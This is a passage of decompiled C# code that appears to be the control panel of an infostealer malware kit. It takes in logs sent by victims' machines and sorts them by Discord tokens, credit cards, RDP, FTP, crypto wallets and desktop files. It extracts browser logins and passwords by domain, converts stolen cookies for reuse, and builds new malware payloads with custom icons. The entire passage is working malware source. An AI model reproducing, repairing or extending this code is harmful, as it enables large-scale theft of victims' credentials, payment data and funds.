							if (((request5 != null) ? request5.Discord.token : null) != null)
							{
								CredentialsRequest request6 = request;
								if (((request6 != null) ? request6.Discord.events : null) != null)
								{
									CredentialsRequest request7 = request;
									if (((request7 != null) ? request7.Discord : null) != null && !this.LogsVM.PathsToLogs.ClientsWithDiscord.Contains(text))
									{
										this.LogsVM.PathsToLogs.ClientsWithDiscord.Add(text);
									}
								}
							}
							CredentialsRequest request8 = request;
							bool flag6;
							if (request8 == null)
							{
								flag6 = false;
							}
							else
							{
								List<DesktopFile> desktopFiles = request8.DesktopFiles;
								int? num2 = (desktopFiles != null) ? new int?(desktopFiles.Count) : null;
								int num3 = 0;
								flag6 = (num2.GetValueOrDefault() > num3 & num2 != null);
							}
							if (flag6 && !this.LogsVM.PathsToLogs.ClientsWithDesktopFiles.Contains(text))
							{
								this.LogsVM.PathsToLogs.ClientsWithDesktopFiles.Add(text);
							}
							CredentialsRequest request9 = request;
							bool flag7;
							if (request9 == null)
							{
								flag7 = false;
							}
							else
							{
								List<BrowserProfile> browserProfiles = request9.BrowserProfiles;
								int? num4;
								if (browserProfiles == null)
								{
									num4 = null;
								}
								else
								{
									IEnumerable<BrowserProfile> enumerable = from x in browserProfiles
									where x.BrowserCreditCards.Count > 0
									select x;
									if (enumerable == null)
									{
										num4 = null;
									}
									else
									{
										num4 = new int?(enumerable.SelectMany((BrowserProfile x) => x.BrowserCreditCards).Count<BrowserCreditCard>());
									}
								}
								int? num2 = num4;
								int num3 = 0;
								flag7 = (num2.GetValueOrDefault() > num3 & num2 != null);
							}
							if (flag7 && !this.LogsVM.PathsToLogs.ClientsWithCreditCards.Contains(text))
							{
								this.LogsVM.PathsToLogs.ClientsWithCreditCards.Add(text);
							}
							this.LogsVM.PathsToLogs.Save();
							this.LogsVM.PathsToLogs.SusspendNotifies(true);
						}
					});
					await message.SendResponse(session, true);
				}
				else
				{
					this.OnSystemLogInvoked("ServerManager", "Recieved EMPTY log from " + request.ClientInformation.HardwareID + " | " + request.ClientInformation.ClientIP);
					session.Close(SuperSocket.SocketBase.CloseReason.ServerClosing);
				}
			}
			catch (Exception arg)
			{
				this.OnSystemLogInvoked("ServerManager", string.Format("Recieved error in [Credentials] method: {0}", arg));
				session.Close(SuperSocket.SocketBase.CloseReason.ServerClosing);
			}
		}

		// Token: 0x06000106 RID: 262 RVA: 0x00004B54 File Offset: 0x00002D54
		public async void ParseClientSettingsRequest(RequestBase message, WebSocketSession session)
		{
			try
			{
				string body = ((Request<string>)message).IsNull(new Request<string>()).Body;
				await message.SendResponse(session, this.ClientSettings);
			}
			catch (Exception arg)
			{
				this.OnSystemLogInvoked("PanelViewModel", string.Format("Recieved error in [ParseClientSettings] method: {0}", arg));
				session.Close(SuperSocket.SocketBase.CloseReason.ServerClosing);
			}
		}

		// Token: 0x06000107 RID: 263 RVA: 0x00004BA0 File Offset: 0x00002DA0
		public void OnSystemLogInvoked(string sender, string arguments)
		{
			string text = string.Format("{0} | From {1}:\t{2}", DateTime.Now, sender, arguments);
			object obj = this.logLock;
			lock (obj)
			{
				WindowsFormsSynchronizationContext synchronization = this.Synchronization;
				if (synchronization != null)
				{
					synchronization.Post(delegate(object state)
					{
						this.ServerLogs.Add((string)state);
					}, text);
				}
				File.AppendAllText("logs.txt", text + Environment.NewLine);
			}
		}

		// Token: 0x1700006D RID: 109
		// (get) Token: 0x06000108 RID: 264 RVA: 0x00002EDD File Offset: 0x000010DD
		// (set) Token: 0x06000109 RID: 265 RVA: 0x00002EE5 File Offset: 0x000010E5
		public ReactiveCommand<CancelEventArgs, Unit> CloseApplicationCommand
		{
			[CompilerGenerated]
			get
			{
				return this.<CloseApplicationCommand>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<CloseApplicationCommand>k__BackingField, value))
				{
					return;
				}
				this.<CloseApplicationCommand>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.CloseApplicationCommand);
			}
		}

		// Token: 0x1700006E RID: 110
		// (get) Token: 0x0600010A RID: 266 RVA: 0x00002F0A File Offset: 0x0000110A
		public ReactiveCommand<Unit, Unit> ConvertToJsonCommand { get; }

		// Token: 0x1700006F RID: 111
		// (get) Token: 0x0600010B RID: 267 RVA: 0x00002F12 File Offset: 0x00001112
		public ReactiveCommand<Unit, Unit> ConvertToNetscapeCommand { get; }

		// Token: 0x17000070 RID: 112
		// (get) Token: 0x0600010C RID: 268 RVA: 0x00002F1A File Offset: 0x0000111A
		public ReactiveCommand<Unit, Unit> AddNewExtCommand { get; }

		// Token: 0x17000071 RID: 113
		// (get) Token: 0x0600010D RID: 269 RVA: 0x00002F22 File Offset: 0x00001122
		public ReactiveCommand<Unit, Unit> OpenLogsFolderCommand { get; }

		// Token: 0x17000072 RID: 114
		// (get) Token: 0x0600010E RID: 270 RVA: 0x00002F2A File Offset: 0x0000112A
		public ReactiveCommand<string, Unit> SaveDomainsCommand { get; }

		// Token: 0x17000073 RID: 115
		// (get) Token: 0x0600010F RID: 271 RVA: 0x00002F32 File Offset: 0x00001132
		public ReactiveCommand<Unit, Unit> OpenIconCommand { get; }

		// Token: 0x17000074 RID: 116
		// (get) Token: 0x06000110 RID: 272 RVA: 0x00002F3A File Offset: 0x0000113A
		public ReactiveCommand<Unit, Unit> CreateBuildCommand { get; }

		// Token: 0x17000075 RID: 117
		// (get) Token: 0x06000111 RID: 273 RVA: 0x00002F42 File Offset: 0x00001142
		public ReactiveCommand<Unit, Unit> FilterDomainsCommand { get; }

		// Token: 0x06000112 RID: 274 RVA: 0x00002F4A File Offset: 0x0000114A
		public void ChangeTheme()
		{
			if (this.CurrentThemeStyle == Style.Dark)
			{
				this.CurrentThemeStyle = Style.Light;
				return;
			}
			if (this.CurrentThemeStyle == Style.Light)
			{
				this.CurrentThemeStyle = Style.Dark;
			}
		}

		// Token: 0x06000113 RID: 275 RVA: 0x00004C24 File Offset: 0x00002E24
		public void AddNewExt()
		{
			try
			{
				if (!string.IsNullOrWhiteSpace(this.CurrentDesktopExt) && !this.ClientSettings.DesktopExtensions.Contains(this.CurrentDesktopExt))
				{
					ClientSettings clientSettings = this.ClientSettings;
					if (clientSettings != null)
					{
						BindingList<string> desktopExtensions = clientSettings.DesktopExtensions;
						if (desktopExtensions != null)
						{
							desktopExtensions.Add(this.CurrentDesktopExt);
						}
					}
					ClientSettings clientSettings2 = this.ClientSettings;
					if (clientSettings2 != null)
					{
						clientSettings2.Save();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.ToString());
			}
		}

		// Token: 0x06000114 RID: 276 RVA: 0x00004CA8 File Offset: 0x00002EA8
		public void RemoveExt(int index)
		{
			try
			{
				ClientSettings clientSettings = this.ClientSettings;
				if (clientSettings != null)
				{
					BindingList<string> desktopExtensions = clientSettings.DesktopExtensions;
					if (desktopExtensions != null)
					{
						desktopExtensions.RemoveAt(index);
					}
				}
				ClientSettings clientSettings2 = this.ClientSettings;
				if (clientSettings2 != null)
				{
					clientSettings2.Save();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.ToString());
			}
		}

		// Token: 0x06000115 RID: 277 RVA: 0x00004D04 File Offset: 0x00002F04
		public async void CurrentPathsSource(string current)
		{
			try
			{
				this.CurrentPaths.Clear();
				this.CurrentPaths.RaiseListChangedEvents = false;
				if (current == "Telegram")
				{
					this.CurrentPaths.Add(this.LogsVM.PathsToLogs.ClientsWithTelegram);
				}
				else if (current == "Discord")
				{
					this.CurrentPaths.Add(this.LogsVM.PathsToLogs.ClientsWithDiscord);
				}
				else if (current == "CC")
				{
					this.CurrentPaths.Add(this.LogsVM.PathsToLogs.ClientsWithCreditCards);
				}
				else if (current == "Desktop")
				{
					this.CurrentPaths.Add(this.LogsVM.PathsToLogs.ClientsWithDesktopFiles);
				}
				else if (current == "RDP")
				{
					this.CurrentPaths.Add(this.LogsVM.PathsToLogs.ClientsWithRDP);
				}
				else if (current == "FTP")
				{
					this.CurrentPaths.Add(this.LogsVM.PathsToLogs.ClientsWithFTP);
				}
				else if (current == "WALLETS")
				{
					this.CurrentPaths.Add(this.LogsVM.PathsToLogs.ClientsWithCrypto);
				}
				else if (current.Split(new char[]
				{
					'|'
				})[0] == "Country")
				{
					Dictionary<string, List<string>> dictionary = await Task.Factory.StartNew<Dictionary<string, List<string>>>(() => this.LogsVM.Logs.Collection.ToArray<RemoteClientInformation>().SelectBy((RemoteClientInformation x) => x.Country, (RemoteClientInformation x) => Path.Combine(Directory.GetCurrentDirectory(), "Results", string.Concat(new string[]
					{
						"[",
						x.HardwareID,
						"] [",
						x.UserName,
						"]"
					}))));
					if (dictionary.ContainsKey(current.Split(new char[]
					{
						'|'
					})[1]))
					{
						this.CurrentPaths.Add(dictionary[current.Split(new char[]
						{
							'|'
						})[1]].Distinct<string>());
					}
				}
				this.CurrentPaths.RaiseListChangedEvents = true;
				this.CurrentPaths.ResetBindings();
				if (this.CurrentPaths.Count > 0)
				{
					this.ChangeShowing();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.ToString());
			}
		}

		// Token: 0x06000116 RID: 278 RVA: 0x00002F6C File Offset: 0x0000116C
		public void ChangeShowing()
		{
			WindowsFormsSynchronizationContext synchronization = this.Synchronization;
			if (synchronization == null)
			{
				return;
			}
			synchronization.Send(delegate(object _)
			{
				this.ShowingPaths = !this.ShowingPaths;
			}, null);
		}

		// Token: 0x06000117 RID: 279 RVA: 0x00004D48 File Offset: 0x00002F48
		private async Task SaveDomains(string currentDomain)
		{
			PanelViewModel.<>c__DisplayClass149_0 CS$<>8__locals1 = new PanelViewModel.<>c__DisplayClass149_0();
			CS$<>8__locals1.<>4__this = this;
			CS$<>8__locals1.currentDomain = currentDomain;
			try
			{
				PanelViewModel.<>c__DisplayClass149_1 CS$<>8__locals2 = new PanelViewModel.<>c__DisplayClass149_1();
				CS$<>8__locals2.CS$<>8__locals1 = CS$<>8__locals1;
				if (!string.IsNullOrWhiteSpace(CS$<>8__locals2.CS$<>8__locals1.currentDomain))
				{
					if (!string.IsNullOrWhiteSpace(this.CurrentAccountFormatter))
					{
						if (this._domainDict != null)
						{
							if (this._domainDict.ContainsKey(CS$<>8__locals2.CS$<>8__locals1.currentDomain))
							{
								CS$<>8__locals2.fileName = string.Concat(new string[]
								{
									"Accounts_",
									CS$<>8__locals2.CS$<>8__locals1.currentDomain,
									"_",
									DateTime.Now.ToString("hh-mm-ss"),
									".txt"
								});
								await Task.Factory.StartNew(delegate()
								{
									string fileName = CS$<>8__locals2.fileName;
									IEnumerable<AccountProfile> source = CS$<>8__locals2.CS$<>8__locals1.<>4__this._domainDict[CS$<>8__locals2.CS$<>8__locals1.currentDomain];
									Func<AccountProfile, string> selector;
									if ((selector = CS$<>8__locals2.CS$<>8__locals1.<>9__1) == null)
									{
										selector = (CS$<>8__locals2.CS$<>8__locals1.<>9__1 = ((AccountProfile x) => x.FormatedString(CS$<>8__locals2.CS$<>8__locals1.<>4__this.CurrentAccountFormatter)));
									}
									File.WriteAllLines(fileName, source.Select(selector).Distinct<string>());
								}).ConfigureAwait(false);
								if (File.Exists(CS$<>8__locals2.fileName))
								{
									Process.Start(CS$<>8__locals2.fileName);
								}
								CS$<>8__locals2 = null;
							}
						}
					}
				}
			}
			catch (Exception arg)
			{
				MessageBox.Show("Saving error: " + arg);
			}
		}

		// Token: 0x06000118 RID: 280 RVA: 0x00004D98 File Offset: 0x00002F98
		private async Task ConvertToJson()
		{
			await Task.Factory.StartNew(delegate()
			{
				string path;
				if (this.SelectFile(out path) == DialogResult.OK)
				{
					IEnumerable<BrowserCookie> enumerable = File.ReadAllLines(path).CookiesFromNetscape().IsNull(new List<BrowserCookie>());
					if (enumerable.Any<BrowserCookie>())
					{
						string text = "JsonCookies_" + DateTime.Now.ToString("O").Replace(':', '_') + ".json";
						File.AppendAllText(text, enumerable.CookiesToJSON().Replace("\"expirationDate\":\"", "\"expirationDate\":").Replace("\",\"name\":\"", ",\"name\":\""));
						MessageBox.Show("Cookies saved to " + text);
						Process.Start(Path.Combine(Directory.GetCurrentDirectory(), text));
						return;
					}
					MessageBox.Show("Cookies UNKNOWN");
				}
			}).ConfigureAwait(false);
		}

		// Token: 0x06000119 RID: 281 RVA: 0x00004DE0 File Offset: 0x00002FE0
		private async Task ConvertToNetscape()
		{
			await Task.Factory.StartNew(delegate()
			{
				string path;
				if (this.SelectFile(out path) == DialogResult.OK)
				{
					IEnumerable<BrowserCookie> source = File.ReadAllText(path).CookiesFromJSON().IsNull(new List<BrowserCookie>());
					if (source.Any<BrowserCookie>())
					{
						string text = "NetscapeCookies_" + DateTime.Now.ToString("O").Replace(':', '_') + ".txt";
						File.AppendAllText(text, string.Join(Environment.NewLine, from x in source
						select x.ToString()));
						MessageBox.Show("Cookies saved to " + text);
						Process.Start(Path.Combine(Directory.GetCurrentDirectory(), text));
						return;
					}
					MessageBox.Show("Cookies UNKNOWN");
				}
			}).ConfigureAwait(false);
		}

		// Token: 0x0600011A RID: 282 RVA: 0x00004E28 File Offset: 0x00003028
		private async Task OpenLogsFolder()
		{
			try
			{
				this.IsLogsLoading = true;
				this.IsAvaliableLogs = false;
				if (this.SelectDirectory() == DialogResult.OK)
				{
					this.Domains.Clear();
					LogProfileController logProfileController = new LogProfileController(new ParalleledLogProfile(Directory.EnumerateDirectories(this.CurrentLogDirectory).ToList<string>())
					{
						HandlerMap = this._predicateFactory
					});
					this._logs = logProfileController.Load();
					IDictionary<string, IEnumerable<AccountProfile>> domainDict = await this.Extract();
					this._domainDict = domainDict;
					this.DomainsAll = (from x in this._domainDict.Keys
					orderby x
					select x).ToList<string>().IsNull(new List<string>());
					this.Domains.RaiseListChangedEvents = false;
					await Task.Factory.StartNew(delegate()
					{
						WindowsFormsSynchronizationContext synchronization = this.Synchronization;
						if (synchronization == null)
						{
							return;
						}
						synchronization.Post(delegate(object _)
						{
							this.Domains.Add(this.DomainsAll);
						}, null);
					});
					this.Domains.RaiseListChangedEvents = true;
					this.Domains.ResetBindings();
					this.IsAvaliableLogs = true;
				}
			}
			catch (Exception arg)
			{
				MessageBox.Show("Open logs folder error: " + arg);
			}
			finally
			{
				this.IsLogsLoading = false;
			}
		}

		// Token: 0x0600011B RID: 283 RVA: 0x00004E70 File Offset: 0x00003070
		private async Task OpenIcon()
		{
			await Task.Factory.StartNew(delegate()
			{
				try
				{
					WindowsFormsSynchronizationContext synchronization = this.Synchronization;
					if (synchronization != null)
					{
						synchronization.Send(delegate(object _)
						{
							this.IsAvaliableChangeSettings = false;
						}, null);
					}
					string path;
					if (this.SelectFile(out path) == DialogResult.OK)
					{
						WindowsFormsSynchronizationContext synchronization2 = this.Synchronization;
						if (synchronization2 != null)
						{
							synchronization2.Send(delegate(object _)
							{
								this.CurrentIconPath = path;
							}, null);
						}
						this.CompilationSettings.OutputIcon = File.ReadAllBytes(path);
					}
				}
				catch (Exception arg)
				{
					MessageBox.Show("Open icon error: " + arg);
				}
				finally
				{
					WindowsFormsSynchronizationContext synchronization3 = this.Synchronization;
					if (synchronization3 != null)
					{
						synchronization3.Send(delegate(object _)
						{
							this.IsAvaliableChangeSettings = true;
						}, null);
					}
				}
			});
		}

		// Token: 0x0600011C RID: 284 RVA: 0x00004EB8 File Offset: 0x000030B8
		private async void CreateBuild()
		{
			try
			{
				this.IsAvaliableChangeSettings = false;
				string path;
				if (this.SaveFile(out path) == DialogResult.OK)
				{
					FileInfo fileInfo = new FileInfo(path);
					this.CompilationSettings.OutputName = fileInfo.Name;
					byte[] bytes = await ServerWCF.CreateBuild(this.Account, this.CompilationSettings);
					File.WriteAllBytes(path, bytes);
					MessageBox.Show("Successfully. Saved to " + path);
				}
				path = null;
			}
			catch (Exception arg)
			{
				MessageBox.Show("Creation build error: " + arg);
			}
			finally
			{
				this.IsAvaliableChangeSettings = true;
			}
		}

		// Token: 0x0600011D RID: 285 RVA: 0x00004EF4 File Offset: 0x000030F4
		private async Task FilterDomains()
		{
			try
			{
				if (string.IsNullOrWhiteSpace(this.CurrentDomainFilter))
				{
					this.Domains.RaiseListChangedEvents = false;
					await Task.Factory.StartNew(delegate()
					{
						WindowsFormsSynchronizationContext synchronization = this.Synchronization;
						if (synchronization == null)
						{
							return;
						}
						synchronization.Post(delegate(object _)
						{
							object obj = this.filterLock;
							lock (obj)
							{
								this.Domains.Clear();
								this.Domains.Add(this.DomainsAll);
							}
						}, null);
					});
					this.Domains.RaiseListChangedEvents = true;
					this.Domains.ResetBindings();
				}
				else
				{
					await Task.Factory.StartNew(delegate()
					{
						WindowsFormsSynchronizationContext synchronization = this.Synchronization;
						if (synchronization == null)
						{
							return;
						}
						synchronization.Send(delegate(object _)
						{
							this.DomainsFiltered = (from x in this.DomainsAll
							where x.Contains(this.CurrentDomainFilter)
							select x).ToList<string>().IsNull(new List<string>());
						}, null);
					});
					this.Domains.RaiseListChangedEvents = false;
					await Task.Factory.StartNew(delegate()
					{
						WindowsFormsSynchronizationContext synchronization = this.Synchronization;
						if (synchronization == null)
						{
							return;
						}
						synchronization.Post(delegate(object _)
						{
							object obj = this.filterLock;
							lock (obj)
							{
								this.Domains.Clear();
								this.Domains.Add(this.DomainsFiltered);
							}
						}, null);
					});
					this.Domains.RaiseListChangedEvents = true;
					this.Domains.ResetBindings();
				}
			}
			catch (Exception arg)
			{
				MessageBox.Show("Filter domains error: " + arg);
			}
		}

		// Token: 0x0600011E RID: 286 RVA: 0x00004F3C File Offset: 0x0000313C
		public async Task<IDictionary<string, IEnumerable<AccountProfile>>> Extract()
		{
			return await Task.Factory.StartNew<IDictionary<string, IEnumerable<AccountProfile>>>(delegate()
			{
				new ConcurrentDictionary<string, IEnumerable<AbstractAccount>>();
				List<AccountProfile> list = new List<AccountProfile>();
				using (IEnumerator<AbstractLogProfile> enumerator = this._logs.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						AbstractLogProfile profile = enumerator.Current;
						using (IEnumerator<AbstractBrowserProfile> enumerator2 = profile.Browsers.GetEnumerator())
						{
							while (enumerator2.MoveNext())
							{
								AbstractBrowserProfile browser = enumerator2.Current;
								IEnumerable<AccountProfile> enumerable = from x in (from x in browser.Accounts
								where Uri.IsWellFormedUriString(x.URL, UriKind.Absolute)
								select x).DistinctBy((AbstractAccount x) => new
								{
									x.URL,
									x.Login,
									x.Password
								})
								select new AccountProfile
								{
									HWID = profile.HWID,
									Login = x.Login,
									Password = x.Password,
									URL = x.URL,
									Browser = browser.Browser + "_" + browser.Profile
								};
								if (enumerable != null && enumerable.Count<AccountProfile>() > 0)
								{
									list.AddRange(enumerable);
								}
							}
						}
					}
				}
				return new ConcurrentDictionary<string, IEnumerable<AccountProfile>>((from x in list
				group x by new Uri(x.URL).Host).ToDictionary((IGrouping<string, AccountProfile> key) => key.Key, (IGrouping<string, AccountProfile> k) => from x in k
				select x));
			});
		}

		// Token: 0x0600011F RID: 287 RVA: 0x00004F84 File Offset: 0x00003184
		private DialogResult SelectFile(out string filePath)
		{
			PanelViewModel.<>c__DisplayClass157_0 CS$<>8__locals1 = new PanelViewModel.<>c__DisplayClass157_0();
			CS$<>8__locals1.result = DialogResult.None;
			CS$<>8__locals1.controlSch = (ControlScheduler)base.Scheduler;
			DialogResult result;
			using (OpenFileDialog ofd = new OpenFileDialog())
			{
				ofd.CheckFileExists = true;
				ofd.CheckPathExists = true;
				ofd.InitialDirectory = Directory.GetCurrentDirectory();
				ofd.Multiselect = false;
				ofd.RestoreDirectory = true;
				this.Synchronization.Send(delegate(object _)
				{
					CS$<>8__locals1.result = ofd.ShowDialog(CS$<>8__locals1.controlSch.Control);
				}, null);
				filePath = ofd.FileName;
				result = CS$<>8__locals1.result;
			}
			return result;
		}

		// Token: 0x06000120 RID: 288 RVA: 0x00005060 File Offset: 0x00003260
		private DialogResult SaveFile(out string filePath)
		{
			PanelViewModel.<>c__DisplayClass158_0 CS$<>8__locals1 = new PanelViewModel.<>c__DisplayClass158_0();
			CS$<>8__locals1.result = DialogResult.None;
			CS$<>8__locals1.controlSch = (ControlScheduler)base.Scheduler;
			DialogResult result;
			using (SaveFileDialog ofd = new SaveFileDialog())
			{
				ofd.CheckPathExists = true;
				ofd.InitialDirectory = Directory.GetCurrentDirectory();
				ofd.RestoreDirectory = true;
				this.Synchronization.Send(delegate(object _)
				{
					CS$<>8__locals1.result = ofd.ShowDialog(CS$<>8__locals1.controlSch.Control);
				}, null);
				filePath = ofd.FileName;
				result = CS$<>8__locals1.result;
			}
			return result;
		}

		// Token: 0x06000121 RID: 289 RVA: 0x00005124 File Offset: 0x00003324
		private DialogResult SelectDirectory()
		{
			ControlScheduler controlScheduler = (ControlScheduler)base.Scheduler;
			DialogResult result = DialogResult.None;
			FolderSelectDialog ofd = new FolderSelectDialog
			{
				InitialDirectory = Directory.GetCurrentDirectory(),
				Title = "Select a folder to import logs from"
			};
			WindowsFormsSynchronizationContext synchronization = this.Synchronization;
			if (synchronization != null)
			{
				synchronization.Send(delegate(object _)
				{
					if (ofd.Show(this.OwnerControl.Control.Handle))
					{
						this.CurrentLogDirectory = ofd.FileName;
						result = DialogResult.OK;
						return;
					}
					this.CurrentLogDirectory = string.Empty;
					result = DialogResult.Cancel;
				}, null);
			}
			return result;
		}

		// Token: 0x0400002F RID: 47
		private readonly object filterLock = new object();

		// Token: 0x04000030 RID: 48
		private readonly object logLock = new object();

		// Token: 0x04000031 RID: 49
		private readonly object countLock = new object();

		// Token: 0x04000032 RID: 50
		private readonly PredicateFactory<string, AbstractLogProfile> _predicateFactory;

		// Token: 0x04000033 RID: 51
		private IEnumerable<AbstractLogProfile> _logs;

		// Token: 0x04000034 RID: 52
		private IDictionary<string, IEnumerable<AccountProfile>> _domainDict;
	}
}
